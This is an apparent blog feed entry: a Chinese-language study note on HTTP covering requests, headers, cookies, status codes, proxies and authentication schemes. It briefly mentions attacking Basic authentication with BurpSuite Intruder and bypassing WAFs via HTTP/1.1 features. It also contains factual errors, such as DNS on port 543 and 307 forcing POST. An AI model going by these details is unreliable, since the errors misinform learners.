    <id>https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BHTTP/</id>
    <published>2020-08-12T12:04:00.000Z</published>
    <updated>2020-08-12T08:40:20.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP协议概述"><a href="#HTTP协议概述" class="headerlink" title="HTTP协议概述"></a>HTTP协议概述</h1><p>HTTP 对 TCP 连接的使用，分为两种方式：俗称“短连接”和“长连接” ；HTTP/1.1 默认使用长连接(持久化连接)</p><p><strong>与HTTPS的主要区别</strong></p><blockquote><p>HTTP是明文传输；HTTPS是SSL加密传输</p><p>HTTP是无状态的，简单但不安全；HTTPS需要身份认证，加密传输，比HTTP安全</p></blockquote><h4 id="当你输入一个网址，点击访问，会发生什么？"><a href="#当你输入一个网址，点击访问，会发生什么？" class="headerlink" title="当你输入一个网址，点击访问，会发生什么？"></a>当你输入一个网址，点击访问，会发生什么？</h4><p><strong>查找DNS记录</strong></p><ol><li>查看浏览器缓存</li><li>查看系统缓存</li><li>查看路由器缓存</li><li>查找ISP DNS缓存</li><li>递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP</li></ol><p><strong>建立连接</strong></p><ol><li>跟获取到的IP建立TCP连接，在TCP连接(80端口)上发送HTTP报文；根据规则， 只有低层协议建立之后才能，才能进行高层协议的连接 </li><li>发送请求行，<code>GET  /dir/xx.php HTTP/1.1</code></li><li>发送请求头，浏览器发送一行空白行来告知服务器结束请求头信息发送</li><li>服务器响应， <code>HTTP/1.1 200 OK</code>（协议版本号和HTTP状态码）</li><li>服务器发送响应头，服务器自己的相关信息（同样用空白行表示结束响应头）</li><li>服务器向浏览器发送数据， 以<code>Content-Type</code>响应头信息所描述的格式发送用户所请求的实际数据 </li><li>服务器关闭TCP连接，如果请求头或响应头加了这行 <code>Connection:keep-alive</code> 代码，会保持连接</li></ol><p><strong>请求方法</strong></p><blockquote><p><strong>GET：</strong>用于请求已被URL识别的资源</p><p><strong>POST：</strong>用于向服务器传输数据，例如提交表单、文件上传</p><p><strong>OPTIONS</strong>：查询相应URL支持的HTTP方法 </p><p><strong>HEAD：</strong> 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效 </p><p><strong>PUT：</strong> 上传文件，报文主体中包含文件内容，保存到对应URL位置 </p><p><strong>DELETE</strong>：删除文件，与PUT方法相反，删除对应URI位置的文件 </p><p><strong>TRACE：</strong> 用于诊断，响应中返回收到请求消息的具体内容</p></blockquote><h1 id="常见请求头"><a href="#常见请求头" class="headerlink" title="常见请求头"></a>常见请求头</h1><h4 id="通用首部字段（请求报文与响应报文都会使用的首部字段）"><a href="#通用首部字段（请求报文与响应报文都会使用的首部字段）" class="headerlink" title="通用首部字段（请求报文与响应报文都会使用的首部字段）"></a>通用首部字段（请求报文与响应报文都会使用的首部字段）</h4><blockquote><p>Date：报文创建时间<br><strong>Connection：</strong>连接的管理，告诉通信另一端完成HTTP传输后，是关闭TCP连接，还是保持连接以接受其它消息<br>Cache-Control：缓存的控制<br>Transfer-Encoding：报文主体的传输编码方式</p></blockquote><h4 id="请求首部字段（请求报文会使用的首部字段）"><a href="#请求首部字段（请求报文会使用的首部字段）" class="headerlink" title="请求首部字段（请求报文会使用的首部字段）"></a>请求首部字段（请求报文会使用的首部字段）</h4><blockquote><p>Host：请求资源所在服务器和端口号<br>Accept：可处理的媒体类型<br>Accept-Charset：可接收的字符集<br>Accept-Encoding：可接受的内容编码<br>Accept-Language：可接受的自然语言</p><p><strong>Cookie：</strong>用于向服务器提交它以前发布的cookie</p><p><strong>If-Modified-Since：</strong> 用于说明最后一次收到所请求资源的时间</p><p>如果自那之后资源没有变化，服务器会返回一个状态码304的响应，指示客户端使用资源的缓存副本</p><p><strong>If-None-Match：</strong>用于指定一个实体标签</p><p>当最后一次收到所请的求资源时，浏览器提交服务器发布的实体标签</p><p>服务器可以使用实体标签，确认浏览器是否使用资源的缓存副本</p><p><strong>Origin：</strong> 用在Ajax跨域请求中，用于指示提出请求的域</p><p><strong>Referer：</strong>指示发出当前请求的原始URL</p><p><strong>User-Agent</strong>    提供生成请求客户端软件的有关信息</p></blockquote><h4 id="响应首部字段（响应报文会使用的首部字段）"><a href="#响应首部字段（响应报文会使用的首部字段）" class="headerlink" title="响应首部字段（响应报文会使用的首部字段）"></a>响应首部字段（响应报文会使用的首部字段）</h4><blockquote><p>Allow：资源可支持的HTTP方法<br>Location：在重定向响应中，说明重定向的目标<br>Server：提供所使用的Web服务器软件的信息</p><p>Accept-Ranges：可接受的字节范围</p></blockquote><h4 id="实体首部字段（请求报文与响应报文的消息主体部分使用的首部字段）"><a href="#实体首部字段（请求报文与响应报文的消息主体部分使用的首部字段）" class="headerlink" title="实体首部字段（请求报文与响应报文的消息主体部分使用的首部字段）"></a>实体首部字段（请求报文与响应报文的消息主体部分使用的首部字段）</h4><blockquote><p><strong>Content-Type</strong>：规定消息主体的类型<br><strong>Content-Encoding：</strong>实体主体适用的编码方式，一些应用程序用它压缩响应加快传输<br>Content-Language：实体主体的自然语言<br><strong>Content-Length：</strong>规定消息主体的字节长度 (HEAD方法例外)<br>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</p><p><strong>Transfer-Encoding：</strong> chunked 分块传输；常用它指定块编码，它是指定HTTP传输对消息主体使用的任何编码的</p><p><strong>Access-Control-Allow-Origin：</strong>指示可否通过跨域Ajax请求获取资源</p><p><strong>ETag：</strong>用于指定一个实体标签。</p><p>客户端可在将来的请求中提交这个标识符，获取和If-None-Match消息头中相同的资源</p><p>通知服务器浏览器当前缓存中保存的是哪个版本的资源</p><p><strong>Expirses：</strong> 用于向浏览器说明消息主体内容的有效时间，在这个时间内浏览器可以使用这个资源的缓存副本</p><p><strong>Pragma</strong>    指示浏览器不要将响应保存在缓存中(no-cache)</p><p><strong>Set-Cookie：</strong>用于向浏览器发布Cookie，浏览器会在随后的请求中将其返回给服务器</p><p><strong>WWW-Authenticate：</strong>在带401状态码的响应中，提供与服务器所支持的身份验证类型的有关信息 (如基础认证)</p><p>X-Frame-Options：指示浏览器框架是否加载以及如何加载当前响应</p></blockquote><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><strong>Cookie</strong></h4><p>HTTP协议是无状态的，为使用正确的状态数据处理每个请求，常用Cookie对用户会话进行唯一标识。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie<span class="comment">//获取cookie</span></span><br></pre></td></tr></table></figure><p>Cookie 一般由一个 <code>名/值</code> 对组成(id=12345)，也可以包含任何不含空格的字符串。</p><p>除Cookie的实际值外，Set-Cookie消息头还可以包含以下可选属性，用它们控制浏览器处理Cookie的方式。</p><blockquote><p><strong>expires：</strong>用于设定Cookie有效时间，此时间内cookie一直有效</p><p>如果没设这个属性cookie仅在当前浏览器会话中有用，关闭浏览器将失效</p><p><strong>domain：</strong>用于指定cookie的有效域，这个域必须和收到Cookie的域相同，或是它的父域</p><p>path：指定cookie的有效URL路径</p><p>secure：如果设置这个属性，则仅在HTTPS请求中提交Cookie</p><p>HTTPOnly：如果设置这个属性，将无法通过客户端javascript直接访问Cookie</p></blockquote><h1 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h1><blockquote><p>100：表示收到请求消息头，客户端应继续发送主体</p><p>200：请求被正常处理</p><p>201：PUT请求返回这个状态码，表示请求已成功提交</p><p>204：请求被受理但没有资源可以返回<br>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。<br>301：永久性重定向<br>302：临时重定向<br>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上<br>304：发送附带条件的请求时，条件不满足时返回，指示浏览器使用缓存中所请求资源的副本<br>307：临时重定向，与302类似，只是强制要求使用POST方法<br>400：请求报文语法有误，服务器无法识别<br>401：请求需要认证<br>403：请求的对应资源禁止被访问<br>404：服务器无法找到对应资源</p><p>405：不支持请求中使用的请求方法</p><p>413：请求主体过长，服务器无法处理 (探查缓冲区溢出时会有)</p><p>414：请求URL过长，服务器无法处理</p><p>500：服务器内部错误<br>503：服务器正忙，用来说明服务器现在无法为请求提供服务，但将来可以 (服务器负载过大)</p></blockquote><h1 id="HTTP-1-1新特性"><a href="#HTTP-1-1新特性" class="headerlink" title="HTTP/1.1新特性"></a>HTTP/1.1新特性</h1><p>一、 默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求 </p><p>二、 管线化 ( pipelining )，客户端可以同时发出多个HTTP请求，而不用一个个等待响应 </p><p>三、 断点续传。实际上就是利用HTTP消息头使用分块传输编码，将实体主体分块传输 </p><p>(利用新特性有两种绕过WAF的方法)</p><h1 id="HTTP优化方案有哪些呢？"><a href="#HTTP优化方案有哪些呢？" class="headerlink" title="HTTP优化方案有哪些呢？"></a>HTTP优化方案有哪些呢？</h1><p><strong>TCP复用：</strong></p><p>TCP连接复用是将多个客户端的HTTP请求复用到一个服务器端TCP连接上，而HTTP复用则是一个客户端的多个HTTP请求通过一个TCP连接进行处理。</p><p>前者是负载均衡设备的独特功能；而后者是HTTP 1.1协议所支持的新功能，目前被大多数浏览器所支持。</p><p><strong>内容缓存：</strong>将经常用到的内容进行缓存起来，那么客户端就可以直接在内存中获取相应的数据了。</p><p><strong>压缩：</strong>将文本数据进行压缩，减少带宽</p><p><strong>SSL加速（SSL Acceleration）：</strong>使用SSL协议对HTTP协议进行加密，在通道内加密并加速</p><p><strong>TCP缓冲：</strong>通过采用TCP缓冲技术，可以提高服务器端响应时间和处理效率，减少由于通信链路问题给服务器造成的连接负担</p><h1 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h1><p>当配置浏览器使用代理服务器时，它会将所有的请求提交到代理服务器，代理服务器再将请求转给Web服务器。</p><p>常用的代理服务器软件有BurpSuite和Fiddler。</p><p><strong>如果使用代理服务器，HTTP工作机制会出现两方面差异：</strong></p><blockquote><p><strong>(1)</strong> 当使用代理服务器发布HTTP请求时，它会将完整的URL插入请求中</p><p>​      代理服务器将提取主机名和端口，用这些信息将请求指向正确的目标Web服务器</p><p><strong>(2)</strong> 当使用HTTPS时，浏览器无法与代理服务器进行SSL握手，因为这样会破坏隧道，使通信遭受拦截攻击</p><p>​      因此浏览器必须将代理作为一个纯粹的TCP中继，一直开放TCP连接</p></blockquote><h1 id="HTTP身份验证"><a href="#HTTP身份验证" class="headerlink" title="HTTP身份验证"></a>HTTP身份验证</h1><p><strong>Basic：</strong>基础认证，在请求消息头中随每条消息以base64编码字符串的形式发送用户证书。</p><p>使用BurpSuite的Intruder模块自定义迭代器base64编码payload后请求或使用co2插件都可攻击基础认证。</p><p><strong>NTML：</strong>这是一种质询-响应式机制，使用某个Windows NTML协议版本，很大程度上已被 Kerberos 取代。</p><p><strong>Digest：</strong>这是一种质询-响应式机制，随用户证书一起使用一个随机值MD5校验和</p><p>HTTP Basic 与 HTTP Digest 认证现在已经合并成一个标准， 即 RFC2617。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTTP协议概述&quot;&gt;&lt;a href=&quot;#HTTP协议概述&quot; class=&quot;headerlink&quot; title=&quot;HTTP协议概述&quot;&gt;&lt;/a&gt;HTTP协议概述&lt;/h1&gt;&lt;p&gt;HTTP 对 TCP 连接的使用，分为两种方式：俗称“短连接”和“长连接” ；HTTP/1.
      
    
    </summary>
    
    
      <category term="【0】基础知识" scheme="https://wintrysec.github.io/categories/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
</feed>
